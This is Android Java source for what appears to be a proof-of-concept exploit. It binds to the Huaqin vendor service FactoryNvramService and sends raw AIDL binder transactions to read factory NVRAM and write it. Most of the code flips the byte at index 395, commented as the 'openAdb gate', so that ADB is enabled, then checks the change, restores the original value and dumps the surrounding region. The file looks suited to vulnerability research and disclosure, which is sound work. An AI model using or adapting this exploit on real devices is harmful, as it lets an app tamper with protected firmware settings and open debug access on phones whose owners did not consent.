package com.probe.nvaidl;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    static final String TAG = "nvprobe";
    static final String PKG = "com.huaqin.NvService";
    static final String CLS = "com.huaqin.NvService.FactoryNvramService";
    static final String DESC = "aidl.NvAidlService";
    static final int DEPTH = 0x18b;   // 395, the openAdb gate index in PRODUCT_INFO

    static IBinder svc;

    static void log(String s) {
        Log.i(TAG, s);
        System.out.println("[NVP] " + s);
    }

    static String readHex(int start, int end) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(start);
            data.writeInt(end);
            svc.transact(2, data, reply, 0);
            int ex = reply.readInt();
            String r = (ex == 0) ? reply.readString() : null;
            data.recycle();
            reply.recycle();
            return r;
        } catch (Throwable t) {
            return null;
        }
    }

    static int write(int idx, int val) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(idx);
            data.writeInt(val);
            svc.transact(3, data, reply, 0);
            int ex = reply.readInt();
            int r = (ex == 0) ? reply.readInt() : -999;
            data.recycle();
            reply.recycle();
            log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + r);
            return r;
        } catch (Throwable t) {
            log("W EX: " + t);
            return -999;
        }
    }

    static int byteAt(int i) {
        String h = readHex(i, i + 1);
        if (h == null || h.length() < 2) return -1;
        return Integer.parseInt(h.substring(0, 2), 16);
    }

    @Override
    protected void onCreate(Bundle bnd) {
        super.onCreate(bnd);
        log("onCreate uid=" + android.os.Process.myUid());
        try {
            Intent it = new Intent();
            it.setComponent(new ComponentName(PKG, CLS));
            it.setAction("com.huaqin.action.factoryNv");
            ServiceConnection conn = new ServiceConnection() {
                public void onServiceConnected(ComponentName n, IBinder bb) {
                    svc = bb;
                    new Thread() {
                        public void run() {
                            try {
                                log("desc=" + svc.getInterfaceDescriptor());

                                // STEP0: read gate byte (0x18b = 395)
                                int v0 = byteAt(DEPTH);
                                log("GATE idx=" + DEPTH + " current=0x" + Integer.toHexString(v0)
                                        + " ('" + (char) v0 + "')");
                                log("  readFlagsForMTK would return: "
                                        + (v0 == 0x31 ? "1 (openAdb FIRES)" : v0 == 0x32 ? "2 (no action)" : "-1"));

                                // STEP1: set gate to '1'  (selector 1 -> '1')
                                log("STEP1 set gate -> 1 (this satisfies openAdb condition)");
                                write(DEPTH, 1);
                                int v1 = byteAt(DEPTH);
                                log("  VERIFY gate now=0x" + Integer.toHexString(v1)
                                        + " ('" + (char) v1 + "')  gateOpen=" + (v1 == 0x31));

                                // STEP2: restore original value
                                int backSel = (v0 == 0x31) ? 1 : (v0 == 0x32 ? 2 : 0);
                                log("STEP2 restore gate -> selector " + backSel);
                                write(DEPTH, backSel);
                                int v2 = byteAt(DEPTH);
                                log("  VERIFY gate now=0x" + Integer.toHexString(v2)
                                        + " ('" + (char) v2 + "')  restored=" + (v2 == v0));

                                // final: confirm wider region intact
                                log("REGION 384..448 = " + readHex(384, 448));
                            } catch (Throwable t) {
                                log("EX: " + t);
                            }
                        }
                    }.start();
                }
                public void onServiceDisconnected(ComponentName n) { log("disc"); }
            };
            log("bind=" + bindService(it, conn, Context.BIND_AUTO_CREATE));
        } catch (Throwable t) {
            log("EX: " + t);
        }
    }
}